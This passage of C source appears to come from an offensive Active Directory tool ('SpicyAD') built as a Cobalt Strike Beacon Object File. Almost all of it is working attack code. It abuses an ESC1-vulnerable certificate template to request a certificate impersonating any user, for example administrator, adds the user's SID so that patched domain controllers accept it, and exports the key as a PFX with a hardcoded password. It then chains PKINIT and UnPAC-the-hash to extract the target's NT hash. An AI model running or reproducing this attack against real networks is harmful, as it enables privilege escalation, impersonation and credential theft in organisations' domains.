    DWORD cbEncodedExts = 0;
    CRYPT_ATTR_BLOB attrBlob;
    CRYPT_ATTRIBUTE extReqAttr;
    CERT_PUBLIC_KEY_INFO* pPubKeyInfo = NULL;
    DWORD dwPubKeyInfoLen = 0;
    BYTE* pbEncodedReq = NULL;
    DWORD dwEncodedReqLen = 0;
    CRYPT_ALGORITHM_IDENTIFIER sigAlgo;
    DWORD dwBase64Len = 0;
    char* szBase64Req = NULL;
    /* Heap-allocated buffers to avoid BOF stack overflow */
    char* szAttributes = NULL;
    WCHAR* wszCA = NULL;
    WCHAR* wszReq = NULL;
    WCHAR* wszAttr = NULL;
    char* szCertB64 = NULL;
    BSTR bstrCA = NULL, bstrReq = NULL, bstrAttr = NULL, bstrCert = NULL, bstrMsg = NULL;
    LONG lDisposition = 0, lRequestId = 0;
    DWORD dwCertLen = 0;
    BYTE* pbCert = NULL;
    PCCERT_CONTEXT pStoreCert = NULL;
    CRYPT_KEY_PROV_INFO keyProvInfo;
    CRYPT_DATA_BLOB pfxBlob;
    char* resultPfxB64 = NULL;

    *pfxLen = 0;

    /* Allocate large buffers on heap to avoid BOF stack overflow */
    szAttributes = (char*)malloc(1024);
    wszCA = (WCHAR*)malloc(256 * sizeof(WCHAR));
    wszReq = (WCHAR*)malloc(8192 * sizeof(WCHAR));
    wszAttr = (WCHAR*)malloc(1024 * sizeof(WCHAR));
    szCertB64 = (char*)malloc(8192);

    if (!szAttributes || !wszCA || !wszReq || !wszAttr || !szCertB64) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to allocate memory");
        goto cleanup_cert;
    }

    if (!szCA || !szTemplate || !szTargetUPN) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Missing parameters for certificate request");
        return NULL;
    }

    memset(&guid, 0, sizeof(guid));
    memset(&reqInfo, 0, sizeof(reqInfo));
    memset(&otherName, 0, sizeof(otherName));
    memset(altNameEntries, 0, sizeof(altNameEntries));
    memset(&altNameInfo, 0, sizeof(altNameInfo));
    memset(&sanExt, 0, sizeof(sanExt));
    memset(&exts, 0, sizeof(exts));
    memset(&attrBlob, 0, sizeof(attrBlob));
    memset(&extReqAttr, 0, sizeof(extReqAttr));
    memset(&sigAlgo, 0, sizeof(sigAlgo));
    memset(&keyProvInfo, 0, sizeof(keyProvInfo));
    memset(&pfxBlob, 0, sizeof(pfxBlob));

    hr = CoInitializeEx(NULL, 0);
    if (FAILED(hr) && hr != (HRESULT)0x80010106) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] CoInitializeEx failed: 0x%08X", hr);
        return NULL;
    }

    CoCreateGuid(&guid);
    swprintf(wszContainerName, L"ESC1_%08X%04X%04X", guid.Data1, guid.Data2, guid.Data3);

    if (!CryptAcquireContextW(&hProv, wszContainerName, MS_ENHANCED_PROV_W, PROV_RSA_FULL, CRYPT_NEWKEYSET)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to create key container: 0x%08X", GetLastError());
        goto cleanup_cert;
    }

    if (!CryptGenKey(hProv, AT_KEYEXCHANGE, (2048 << 16) | CRYPT_EXPORTABLE, &hKey)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to generate key: 0x%08X", GetLastError());
        goto cleanup_cert;
    }

    reqInfo.dwVersion = 0;
    sprintf(szSubjectCN, "CN=%s", szTargetUPN);

    if (!CertStrToNameA(X509_ASN_ENCODING, szSubjectCN, CERT_X500_NAME_STR, NULL, NULL, &cbSubject, NULL)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to get subject DN size");
        goto cleanup_cert;
    }
    pbSubject = (BYTE*)malloc(cbSubject);
    if (!CertStrToNameA(X509_ASN_ENCODING, szSubjectCN, CERT_X500_NAME_STR, NULL, pbSubject, &cbSubject, NULL)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to encode subject DN");
        free(pbSubject);
        goto cleanup_cert;
    }
    reqInfo.Subject.cbData = cbSubject;
    reqInfo.Subject.pbData = pbSubject;

    /* Build SAN extension with UPN */
    {
        DWORD upnLen = (DWORD)strlen(szTargetUPN);
        DWORD totalLen = (upnLen < 128) ? (2 + upnLen) : (4 + upnLen);
        BYTE* p;

        cbEncodedUPN = totalLen;
        pbEncodedUPN = (BYTE*)LocalAlloc(LPTR, cbEncodedUPN);
        if (!pbEncodedUPN) {
            BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to allocate UPN buffer");
            free(pbSubject);
            goto cleanup_cert;
        }

        p = pbEncodedUPN;
        *p++ = 0x0C; /* UTF8String */
        if (upnLen < 128) {
            *p++ = (BYTE)upnLen;
        } else {
            *p++ = 0x82;
            *p++ = (BYTE)(upnLen >> 8);
            *p++ = (BYTE)(upnLen & 0xFF);
        }
        memcpy(p, szTargetUPN, upnLen);
    }

    otherName.pszObjId = (LPSTR)szOID_NT_PRINCIPAL_NAME;
    otherName.Value.cbData = cbEncodedUPN;
    otherName.Value.pbData = pbEncodedUPN;

    /* UPN entry */
    altNameEntries[0].dwAltNameChoice = CERT_ALT_NAME_OTHER_NAME;
    altNameEntries[0].pOtherName = &otherName;
    dwAltNameCount = 1;

    /* Lookup SID from AD for KB5014754 Strong Certificate Mapping */
    if (LookupUserSID_Unpac(szTargetUPN, &pbUserSID, &dwUserSIDLen)) {
        LPSTR szSidString = NULL;

        if (ConvertSidToStringSidA((PSID)pbUserSID, &szSidString)) {
            /* Build URL: tag:microsoft.com,2022-09-14:sid:S-1-5-21-xxx */
            static char szSidUrl[256];
            static WCHAR wszSidUrl[256];

            sprintf(szSidUrl, "tag:microsoft.com,2022-09-14:sid:%s", szSidString);
            MultiByteToWideChar(CP_UTF8, 0, szSidUrl, -1, wszSidUrl, 256);

            /* Add as URL entry (CERT_ALT_NAME_URL = 7) */
            altNameEntries[1].dwAltNameChoice = CERT_ALT_NAME_URL;
            altNameEntries[1].pwszURL = wszSidUrl;

            LocalFree(szSidString);

            dwAltNameCount = 2;
        }
        free(pbUserSID);
        pbUserSID = NULL;
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] SID lookup failed - certificate will not include SID");
        BeaconPrintf(CALLBACK_OUTPUT, "[!] This may cause KDC_ERR_CLIENT_NAME_MISMATCH on patched DCs (KB5014754)");
    }

    altNameInfo.cAltEntry = dwAltNameCount;
    altNameInfo.rgAltEntry = altNameEntries;

    if (!CryptEncodeObjectEx(X509_ASN_ENCODING, szOID_SUBJECT_ALT_NAME2, &altNameInfo,
                             CRYPT_ENCODE_ALLOC_FLAG, NULL, &pbEncodedSAN, &cbEncodedSAN)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to encode SAN: 0x%08X", GetLastError());
        LocalFree(pbEncodedUPN);
        free(pbSubject);
        goto cleanup_cert;
    }
    LocalFree(pbEncodedUPN);

    sanExt.pszObjId = (LPSTR)szOID_SUBJECT_ALT_NAME2;
    sanExt.fCritical = FALSE;
    sanExt.Value.cbData = cbEncodedSAN;
    sanExt.Value.pbData = pbEncodedSAN;

    exts.cExtension = 1;
    exts.rgExtension = &sanExt;

    if (!CryptEncodeObjectEx(X509_ASN_ENCODING, X509_EXTENSIONS, &exts,
                             CRYPT_ENCODE_ALLOC_FLAG, NULL, &pbEncodedExts, &cbEncodedExts)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to encode extensions");
        LocalFree(pbEncodedSAN);
        free(pbSubject);
        goto cleanup_cert;
    }
    LocalFree(pbEncodedSAN);

    attrBlob.cbData = cbEncodedExts;
    attrBlob.pbData = pbEncodedExts;

    extReqAttr.pszObjId = (LPSTR)szOID_RSA_certExtensions;
    extReqAttr.cValue = 1;
    extReqAttr.rgValue = &attrBlob;

    reqInfo.cAttribute = 1;
    reqInfo.rgAttribute = &extReqAttr;

    if (!CryptExportPublicKeyInfo(hProv, AT_KEYEXCHANGE, X509_ASN_ENCODING, NULL, &dwPubKeyInfoLen)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to get public key size");
        free(pbSubject);
        LocalFree(pbEncodedExts);
        goto cleanup_cert;
    }
    pPubKeyInfo = (CERT_PUBLIC_KEY_INFO*)malloc(dwPubKeyInfoLen);
    if (!CryptExportPublicKeyInfo(hProv, AT_KEYEXCHANGE, X509_ASN_ENCODING, pPubKeyInfo, &dwPubKeyInfoLen)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to export public key");
        free(pPubKeyInfo);
        free(pbSubject);
        LocalFree(pbEncodedExts);
        goto cleanup_cert;
    }
    reqInfo.SubjectPublicKeyInfo = *pPubKeyInfo;

    sigAlgo.pszObjId = (LPSTR)szOID_RSA_SHA256RSA;

    if (!CryptSignAndEncodeCertificate(hProv, AT_KEYEXCHANGE, X509_ASN_ENCODING,
                                        X509_CERT_REQUEST_TO_BE_SIGNED, &reqInfo,
                                        &sigAlgo, NULL, NULL, &dwEncodedReqLen)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to get CSR size");
        free(pPubKeyInfo);
        free(pbSubject);
        LocalFree(pbEncodedExts);
        goto cleanup_cert;
    }

    pbEncodedReq = (BYTE*)malloc(dwEncodedReqLen);
    if (!CryptSignAndEncodeCertificate(hProv, AT_KEYEXCHANGE, X509_ASN_ENCODING,
                                        X509_CERT_REQUEST_TO_BE_SIGNED, &reqInfo,
                                        &sigAlgo, NULL, pbEncodedReq, &dwEncodedReqLen)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to create CSR");
        free(pPubKeyInfo);
        free(pbSubject);
        LocalFree(pbEncodedExts);
        free(pbEncodedReq);
        goto cleanup_cert;
    }
    free(pPubKeyInfo);
    free(pbSubject);
    LocalFree(pbEncodedExts);

    CryptBinaryToStringA(pbEncodedReq, dwEncodedReqLen, CRYPT_STRING_BASE64, NULL, &dwBase64Len);
    szBase64Req = (char*)malloc(dwBase64Len + 1);
    CryptBinaryToStringA(pbEncodedReq, dwEncodedReqLen, CRYPT_STRING_BASE64, szBase64Req, &dwBase64Len);
    free(pbEncodedReq);

    sprintf(szAttributes, "CertificateTemplate:%s\nSAN:upn=%s", szTemplate, szTargetUPN);

    MultiByteToWideChar(CP_UTF8, 0, szCA, -1, wszCA, 256);
    MultiByteToWideChar(CP_UTF8, 0, szBase64Req, -1, wszReq, 8192);
    MultiByteToWideChar(CP_UTF8, 0, szAttributes, -1, wszAttr, 1024);

    bstrCA = SysAllocString(wszCA);
    bstrReq = SysAllocString(wszReq);
    bstrAttr = SysAllocString(wszAttr);
    free(szBase64Req);

    hr = CoCreateInstance(&CLSID_CCertRequest, NULL, CLSCTX_INPROC_SERVER, &IID_ICertRequest, (void**)&pCertRequest);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to create ICertRequest: 0x%08X", hr);
        SysFreeString(bstrCA);
        SysFreeString(bstrReq);
        SysFreeString(bstrAttr);
        goto cleanup_cert;
    }

    hr = pCertRequest->lpVtbl->Submit(pCertRequest, CR_IN_BASE64 | CR_IN_PKCS10, bstrReq, bstrAttr, bstrCA, &lDisposition);

    SysFreeString(bstrCA);
    SysFreeString(bstrReq);
    SysFreeString(bstrAttr);

    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Submit failed: 0x%08X", hr);
        pCertRequest->lpVtbl->GetDispositionMessage(pCertRequest, &bstrMsg);
        if (bstrMsg) {
            BeaconPrintf(CALLBACK_OUTPUT, "[!] CA Response: %S", bstrMsg);
            SysFreeString(bstrMsg);
        }
        goto cleanup_cert;
    }

    if (lDisposition == CR_DISP_DENIED) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Certificate request DENIED by CA");
        pCertRequest->lpVtbl->GetDispositionMessage(pCertRequest, &bstrMsg);
        if (bstrMsg) {
            BeaconPrintf(CALLBACK_OUTPUT, "[!] Reason: %S", bstrMsg);
            SysFreeString(bstrMsg);
        }
        goto cleanup_cert;
    }
    else if (lDisposition == CR_DISP_UNDER_SUBMISSION) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Certificate request PENDING - requires approval");
        goto cleanup_cert;
    }
    else if (lDisposition != CR_DISP_ISSUED) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Unexpected disposition: %d", lDisposition);
        goto cleanup_cert;
    }

    hr = pCertRequest->lpVtbl->GetCertificate(pCertRequest, CR_OUT_BASE64, &bstrCert);
    if (FAILED(hr) || !bstrCert) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to retrieve certificate: 0x%08X", hr);
        goto cleanup_cert;
    }

    WideCharToMultiByte(CP_UTF8, 0, bstrCert, -1, szCertB64, 8192, NULL, NULL);
    SysFreeString(bstrCert);

    CryptStringToBinaryA(szCertB64, 0, CRYPT_STRING_BASE64, NULL, &dwCertLen, NULL, NULL);
    pbCert = (BYTE*)malloc(dwCertLen);
    CryptStringToBinaryA(szCertB64, 0, CRYPT_STRING_BASE64, pbCert, &dwCertLen, NULL, NULL);

    pCertContext = CertCreateCertificateContext(X509_ASN_ENCODING, pbCert, dwCertLen);
    free(pbCert);

    if (!pCertContext) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to create cert context");
        goto cleanup_cert;
    }

    hMemStore = CertOpenStore(CERT_STORE_PROV_MEMORY, 0, 0, CERT_STORE_CREATE_NEW_FLAG, NULL);
    if (!hMemStore) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to create memory store");
        goto cleanup_cert;
    }

    if (!CertAddCertificateContextToStore(hMemStore, pCertContext, CERT_STORE_ADD_ALWAYS, &pStoreCert)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to add cert to store");
        goto cleanup_cert;
    }

    keyProvInfo.pwszContainerName = wszContainerName;
    keyProvInfo.pwszProvName = MS_ENHANCED_PROV_W;
    keyProvInfo.dwProvType = PROV_RSA_FULL;
    keyProvInfo.dwFlags = 0;
    keyProvInfo.dwKeySpec = AT_KEYEXCHANGE;

    CertSetCertificateContextProperty(pStoreCert, CERT_KEY_PROV_INFO_PROP_ID, 0, &keyProvInfo);

    {
        WCHAR wszPassword[] = L"SpicyAD123";
        DWORD dwB64Len = 0;

        PFXExportCertStoreEx(hMemStore, &pfxBlob, wszPassword, NULL, EXPORT_PRIVATE_KEYS);
        if (pfxBlob.cbData > 0) {
            pfxBlob.pbData = (BYTE*)malloc(pfxBlob.cbData);
            if (PFXExportCertStoreEx(hMemStore, &pfxBlob, wszPassword, NULL, EXPORT_PRIVATE_KEYS)) {
                CryptBinaryToStringA(pfxBlob.pbData, pfxBlob.cbData, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &dwB64Len);
                resultPfxB64 = (char*)malloc(dwB64Len + 1);
                CryptBinaryToStringA(pfxBlob.pbData, pfxBlob.cbData, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, resultPfxB64, &dwB64Len);
                resultPfxB64[dwB64Len] = '\0';
                *pfxLen = dwB64Len;

                free(pfxBlob.pbData);
                bResult = TRUE;
            }
        }
    }

cleanup_cert:
    if (pStoreCert) CertFreeCertificateContext(pStoreCert);
    if (pCertContext) CertFreeCertificateContext(pCertContext);
    if (hMemStore) CertCloseStore(hMemStore, 0);
    if (pCertRequest) pCertRequest->lpVtbl->Release(pCertRequest);
    if (hKey) CryptDestroyKey(hKey);
    if (hProv) {
        CryptReleaseContext(hProv, 0);
        CryptAcquireContextW(&hProv, wszContainerName, MS_ENHANCED_PROV_W, PROV_RSA_FULL, CRYPT_DELETEKEYSET);
    }
    /* Free heap-allocated buffers */
    if (szAttributes) free(szAttributes);
    if (wszCA) free(wszCA);
    if (wszReq) free(wszReq);
    if (wszAttr) free(wszAttr);
    if (szCertB64) free(szCertB64);

    return resultPfxB64;
}

/*
 * =============================================================================
 * Combined ESC1-UnPAC Attack Chain
 * =============================================================================
 */

void DoESC1UnPAC(char* szCA, char* szTemplate, char* szTargetUPN, char* kdcHost) {
    char* pfxBase64 = NULL;
    int pfxLen = 0;
    char user[256] = {0};
    char domain[256] = {0};
    char* atSign;

    if (!szCA || !szTemplate || !szTargetUPN) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Usage: esc1-unpac <CA> <Template> <TargetUPN> [KDC]");
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Example: esc1-unpac \"DC01\\\\Corp-CA\" \"VulnTemplate\" \"administrator@corp.local\" dc01.corp.local");
        return;
    }

    /* Parse target user and domain */
    atSign = strchr(szTargetUPN, '@');
    if (atSign) {
        int userLen = (int)(atSign - szTargetUPN);
        memcpy(user, szTargetUPN, userLen);
        user[userLen] = '\0';
        strcpy(domain, atSign + 1);
    } else {
        strcpy(user, szTargetUPN);
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Target UPN must be in user@domain format");
        return;
    }

    /* Step 1: Request certificate via ESC1 */
    pfxBase64 = DoESC1CertRequest(szCA, szTemplate, szTargetUPN, &pfxLen);

    if (!pfxBase64 || pfxLen == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to obtain certificate - cannot continue");
        return;
    }

    /* Output PFX for user to copy if needed */
    BeaconPrintf(CALLBACK_OUTPUT, "[+] PFX (base64, password: SpicyAD123):");
    BeaconPrintf(CALLBACK_OUTPUT, "%s", pfxBase64);

    /* Step 2: Use certificate for PKINIT + UnPAC */
    /* Call the existing DoESC1FullChain with the obtained PFX */
    DoESC1FullChain(pfxBase64, "SpicyAD123", szTargetUPN, domain, kdcHost, 1);

    /* Cleanup */
    free(pfxBase64);
}

/*
 * =============================================================================
 * Entry Points for Combined BOF
 * =============================================================================
 */

#ifdef BOF
/*
 * BOF Entry Point for ESC1-UnPAC combined attack
 * Arguments: CA, Template, TargetUPN, KDC (optional), nosid (optional)
 */
void go(char* args, int alen) {
    ArgParser parser;
    char* szCA = NULL;
    char* szTemplate = NULL;
    char* szTargetUPN = NULL;
    char* kdcHost = NULL;
    char* nosid = NULL;

    ArgParserInit(&parser, args, alen);

    szCA = ArgParserGetString(&parser);
    szTemplate = ArgParserGetString(&parser);
    szTargetUPN = ArgParserGetString(&parser);
    kdcHost = ArgParserGetString(&parser);
    nosid = ArgParserGetString(&parser);

    (void)nosid; /* Currently unused, reserved for future */

    DoESC1UnPAC(szCA, szTemplate, szTargetUPN, kdcHost);
}
#endif

#ifndef BOF
int main(int argc, char* argv[]) {
    if (argc < 4) {
        printf("SpicyAD ESC1-UnPAC Combined Attack\n\n");
        printf("Usage: %s <CA> <Template> <TargetUPN> [KDC]\n", argv[0]);
        printf("Example: %s \"DC01\\\\Corp-CA\" \"VulnTemplate\" \"administrator@corp.local\" dc01.corp.local\n", argv[0]);
        printf("\nThis tool combines:\n");
        printf("  1. ESC1 - Request certificate with custom SAN from vulnerable template\n");
        printf("  2. PKINIT - Authenticate using the certificate\n");
        printf("  3. UnPAC-the-hash - Extract NT hash from PAC\n");
        return 1;
    }

    DoESC1UnPAC(argv[1], argv[2], argv[3], argc > 4 ? argv[4] : NULL);
    return 0;
}
#endif
